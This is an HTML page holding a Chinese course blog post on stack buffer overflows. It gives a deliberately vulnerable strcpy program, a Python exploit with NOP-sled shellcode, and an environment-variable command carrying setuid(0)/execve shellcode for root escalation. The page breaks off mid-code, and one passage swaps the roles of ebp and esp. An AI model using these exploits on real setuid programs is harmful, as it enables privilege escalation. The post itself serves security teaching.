@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>漏洞分析：缓冲区溢出 - xfarawayx&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。" /><meta name="keywords" content='信息安全, Article' /><meta itemprop="name" content="漏洞分析：缓冲区溢出">
+<meta itemprop="description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。"><meta itemprop="datePublished" content="2023-08-04T14:24:08+08:00" />
+<meta itemprop="dateModified" content="2023-08-04T14:24:08+08:00" />
+<meta itemprop="wordCount" content="3715">
+<meta itemprop="keywords" content="信息安全,Article," /><meta property="og:title" content="漏洞分析：缓冲区溢出" />
+<meta property="og:description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/vul1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-08-04T14:24:08+08:00" />
+<meta property="article:modified_time" content="2023-08-04T14:24:08+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="漏洞分析：缓冲区溢出"/>
+<meta name="twitter:description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/gurimon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://example.org/posts/vul1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "漏洞分析：缓冲区溢出",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/example.org\/posts\/vul1\/"
+    },"genre": "posts","keywords": "信息安全, Article","wordcount":  3715 ,
+    "url": "http:\/\/example.org\/posts\/vul1\/","datePublished": "2023-08-04T14:24:08+08:00","dateModified": "2023-08-04T14:24:08+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "xfarawayx"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="xfarawayx&#39;s Blog"><span class="header-title-text">xfarawayx&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="xfarawayx&#39;s Blog"><span class="header-title-text">xfarawayx&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>漏洞分析：缓冲区溢出</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://xfarawayx.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d=" srcset="https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d=, https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 1.5x, https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 2x" sizes="auto" data-title="xfarawayx" data-alt="xfarawayx" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;xfarawayx</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 专业课</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-08-04 14:24:08"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-08-04">2023-08-04</time></span>&nbsp;<span title="更新于 2023-08-04 14:24:08"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-08-04">2023-08-04</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3715 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-栈帧结构与函数调用过程">1. 栈帧结构与函数调用过程</a></li>
+    <li><a href="#2-栈溢出攻击基本原理">2. 栈溢出攻击基本原理</a></li>
+    <li><a href="#3-栈溢出攻击的基本类型与技巧概述">3. 栈溢出攻击的基本类型与技巧概述</a></li>
+    <li><a href="#4-无栈保护return-to-rootshell">4. 无栈保护：return to rootshell</a>
+      <ul>
+        <li><a href="#41-栈溢出例题1">4.1 栈溢出例题1</a></li>
+        <li><a href="#42-将提权-shell-插入环境变量">4.2 将提权 shell 插入环境变量</a></li>
+        <li><a href="#43-栈溢出例题2">4.3 栈溢出例题2</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-不可执行栈return-to-libc">5. 不可执行栈：Return-to-Libc</a>
+      <ul>
+        <li><a href="#51-栈溢出例题3">5.1 栈溢出例题3</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-地址随机化jmp-esp">6. 地址随机化：JMP ESP</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。</p>
+<h2 id="1-栈帧结构与函数调用过程">1. 栈帧结构与函数调用过程</h2>
+<p>在介绍栈溢出前，我们有必要了解一下栈帧的结构与函数调用与返回的这两个重要的过程。</p>
+<p>每个运行的函数都会在栈上分配一段独立的区域，即为栈帧（Stack Frame）。栈帧存放了函数的返回地址和参数、临时变量、变量函数调用的上下文等。<strong>栈由高地址向低地址延申</strong>。栈指针 sp 指向栈底，存放在寄存器 ebp；帧指针 fp 指向栈顶，存放在寄存器 esp。具体栈帧结构和函数调用、返回的过程如下：</p>
+<p><img loading="lazy" src="/001/01.png" srcset="/001/01.png, /001/01.png 1.5x, /001/01.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>在调用函数前，程序<strong>会先将函数的参数逐一压栈</strong>，然后执行 call：call 语句会<strong>先将返回地址压栈</strong>（返回地址即被调用函数运行结束后跳转到的地址），然后 jmp 到被调用函数。之后程序回味被调用的函数开辟一个新的栈帧，创建栈帧过程如上图所示。</p>
+<p>在被调用函数运行完毕后，程序会执行返回操作，释放开辟的栈帧，过程如上图所示。在执行完毕后，程序会<strong>跳转到返回地址</strong>。</p>
+<p>注：下图与上图栈的顺序不太一样</p>
+<p><img loading="lazy" src="/001/02.jpg" srcset="/001/02.jpg, /001/02.jpg 1.5x, /001/02.jpg 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="2-栈溢出攻击基本原理">2. 栈溢出攻击基本原理</h2>
+<p>由前文可知，栈是<strong>由高地址向低地址延申</strong>的，这意味着在不开启堆栈保护的前提下，我们被调用函数的栈帧的地址是在返回地址之上的。</p>
+<p>众所周知，函数内的局部变量都是定义在栈帧中的。例如如下一个人畜无害的字符数组，栈帧会给它开辟一个233个字节的内存空间：</p>
+<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">233</span><span class="p">];</span></span></span></code></pre></div><p>而众所周知，数组中的元素存放的地址都是从低到高的。不考虑任何的保护措施，假设我们往这个数组里塞超过其长度的内容，那么多出的内容就会覆盖栈帧的其他部分——直到将栈帧填满。此时再塞更长的内容就会覆盖函数的<strong>返回地址</strong>以及更高地址的内容。</p>
+<p>栈溢出攻击的基本原理十分的简单，就是通过溢出这样的字符数组来<strong>覆写返回地址</strong>，使程序跳转到恶意代码（如包含提权 shellcode 的环境变量）或函数。</p>
+<h2 id="3-栈溢出攻击的基本类型与技巧概述">3. 栈溢出攻击的基本类型与技巧概述</h2>
+<p><strong>注意：本文仅探讨关闭 GCC 的栈保护（-fno-stack-protector）的栈溢出</strong></p>
+<p>除了 GCC 的栈保护，编译器还提供以下两种栈保护：</p>
+<ul>
+<li>栈地址随机化：在linux下通过命令 <code>sysctl -w kernel.randomize_va_space=2</code> 开启（默认开启，0即为关闭）。开启后运行的程序的栈帧会随机分配地址。</li>
+<li>不可执行栈：通过在编译命令中加入 <code>-z noexecstack</code> 开启不可执行栈。开启后将无法在栈内执行代码，避免了将程序跳转执行恶意 shellcode 的可能。</li>
+</ul>
+<p>针对不同的保护策略，有如下不同的攻击策略，概述如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">栈溢出保护</th>
+<th style="text-align:center">做法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">无保护</td>
+<td style="text-align:center">直接覆盖返回地址为root shell</td>
+</tr>
+<tr>
+<td style="text-align:center">不可执行栈</td>
+<td style="text-align:center">Return to Libc</td>
+</tr>
+<tr>
+<td style="text-align:center">栈地址随机化</td>
+<td style="text-align:center">JMP ESP / 覆写函数指针</td>
+</tr>
+</tbody>
+</table>
+<p>（两个同时开启暂时不可做）</p>
+<p>对于程序中显著存在的缓冲区漏洞（例如不判断字符串长度直接向字符数组写入可能超过其长度的字符串）我们显然可以直接利用。当然程序中可能会存在一些长度判断语句。如果给定的长度是无符号整数，我们可以善用<strong>整数溢出</strong>来实现缓冲区溢出攻击。</p>
+<p>接下来介绍通过缓冲区溢出，攻击各种保护下的 Set-UID 程序。</p>
+<h2 id="4-无栈保护return-to-rootshell">4. 无栈保护：return to rootshell</h2>
+<p>在不开启任何栈保护的情况下，最简单的方法就是直接利用前文栈溢出攻击的原理，将返回地址覆盖为 root shell 的地址。</p>
+<p>下面通过一个具体的实例展现栈溢出攻击的过程：</p>
+<h3 id="41-栈溢出例题1">4.1 栈溢出例题1</h3>
+<p>（展开代码以查看漏洞程序）</p>
+<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cm">/* stack.c */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* This program has a buffer overflow vulnerability. */</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* Our task is to exploit this vulnerability */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* The following statement has a buffer overflow problem */</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">517</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">badfile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">badfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;badfile&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fread</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mi">517</span><span class="p">,</span> <span class="n">badfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bof</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Returned Properly</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>使用 GDB 对该漏洞程序进行反汇编：</p>
+<p><img loading="lazy" src="/001/03.png" srcset="/001/03.png, /001/03.png 1.5x, /001/03.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>在这里可以看到执行完 bof 函数后的地址为 0x080404ff，即为 bof 函数的返回地址。</p>
+<p>对 bof 函数进行反汇编：</p>
+<p><img loading="lazy" src="/001/04.png" srcset="/001/04.png, /001/04.png 1.5x, /001/04.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>向 Badfile 中写入数据 AAAA，以便后续观察 buffer 在栈中的位置（图略）；</p>
+<p>然后使用 GDB 在 bof 函数的 leave 处（0x080484a1）处设置断点，并查看栈内元素：</p>
+<p><img loading="lazy" src="/001/06.png" srcset="/001/06.png, /001/06.png 1.5x, /001/06.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>可以发现buffer的起始地址与返回地址 0x080404ff 中间相隔 9*4=36 个字节。</p>
+<p>接下来我们需要让 buffer 溢出，并在原来存放返回地址的位置写入恶意代码的地址。</p>
+<p>由于在 GDB 中运行得到的 bof 函数的栈帧地址可能与直接运行时不同。我们可以通过填充 NOP 指令为恶意代码创建大量入口点。使用 NOP 填充使得我们不需要精确预测恶意代码被存放的地址，而只要保证写入的地址能藉由NOP“滑到”恶意代码。</p>
+<p>攻击程序的 Python 代码如下：</p>
+<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x31\xc0</span><span class="s2">&#34;</span>             <span class="c1"># xorl    %eax,%eax</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x50</span><span class="s2">&#34;</span>                 <span class="c1"># pushl   %eax</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x68</span><span class="s2">&#34;&#34;//sh&#34;</span>           <span class="c1"># pushl   $0x68732f2f</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x68</span><span class="s2">&#34;&#34;/bin&#34;</span>           <span class="c1"># pushl   $0x6e69622f</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x89\xe3</span><span class="s2">&#34;</span>             <span class="c1"># movl    %esp,%ebx</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x50</span><span class="s2">&#34;</span>                 <span class="c1"># pushl   %eax</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x53</span><span class="s2">&#34;</span>                 <span class="c1"># pushl   %ebx</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x89\xe1</span><span class="s2">&#34;</span>             <span class="c1"># movl    %esp,%ecx</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\x99</span><span class="s2">&#34;</span>                 <span class="c1"># cdq</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\xb0\x0b</span><span class="s2">&#34;</span>             <span class="c1"># movb    $0x0b,%al</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="se">\xcd\x80</span><span class="s2">&#34;</span>             <span class="c1"># int     $0x80</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;latin-1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">517</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mh">0x90</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell_start</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="p">[</span><span class="n">shell_start</span><span class="p">:]</span> <span class="o">=</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0xbffff110</span> <span class="o">+</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="p">[</span><span class="mi">36</span><span class="p">:</span><span class="mi">40</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;badfile&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p>首先向字符串填充 NOP，然后在最末端插入提权 shellcode。由前面可知，我们需要先填充 36 个字节到达返回地址，并将返回地址修改为能到达恶意代码的入口地址即可。
+这里写入的地址ret比较随意，只要保证在NOP的区间内即可，可选地址区间很大。</p>
+<p>运行 exploit.py 生成攻击缓冲区的字符串 badfile，然后运行程序 stack。</p>
+<p><img loading="lazy" src="/001/07.png" srcset="/001/07.png, /001/07.png 1.5x, /001/07.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>可以看到攻击成功。</p>
+<h3 id="42-将提权-shell-插入环境变量">4.2 将提权 shell 插入环境变量</h3>
+<p>我们可以先将写好的 shell 放在环境变量中，然后通过程序得到环境变量的地址。我们直接将返回地址覆盖为该环境变量的地址即可。</p>
+<p>使用如下命令创建提权 shell 环境变量：</p>
+<pre tabindex="0"><code>export EGG=$(python -c &#34;print &#39;\x90&#39;*1000 + &#39;\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80&#39;&#34;)</code></pre><p>上述 shell 对应的汇编代码如下：</p>
+<pre tabindex="0"><code>setuid(0)
+
+ 8049380:       6a 17                   push   $0x17
+ 8049382:       58                      pop    %eax
+ 8049383:       31 db                   xor    %ebx,%ebx
+ 8049385:       cd 80                   int    $0x80
+
+execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
+
+ 8049387:       6a 0b                   push   $0xb
+ 8049389:       58                      pop    %eax
+ 804938a:       99                      cltd   
+ 804938b:       52                      push   %edx
+ 804938c:       68 2f 2f 73 68          push   $0x68732f2f
+ 8049391:       68 2f 62 69 6e          push   $0x6e69622f
+ 8049396:       89 e3                   mov    %esp,%ebx
+ 8049398:       52                      push   %edx
+ 8049399:       53                      push   %ebx
+ 804939a:       89 e1                   mov    %esp,%ecx
+ 804939c:       cd 80                   int    $0x80</code></pre><p>可以通过编写C程序得到创建的环境变量的地址。注意：环境变量地址会根据程序文件名进行偏移。<strong>故编写的程序应和待攻击程序的文件名长度一致</strong>，这样得到的环境变量地址也是一致的，否则需要计算地址的偏移。</p>
+<div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">//export EGG=$(python -c &#34;print &#39;\x90&#39;*1000 + &#39;\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80&#39;&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Egg address: %p &#34;</span><span class="p">,</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EGG&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>由于未开启栈地址随机化，所以环境变量的地址不会改变。需要注意的是，如果题目的代码预先清空了所有的环境变量，则该方法不能使用。</p>
+<h3 id="43-栈溢出例题2">4.3 栈溢出例题2</h3>
+<p>（展开代码以查看漏洞程序）</p>
+<div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">//q1.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">store_passwd_indb</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">passwd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">validate_uname</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">uname</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
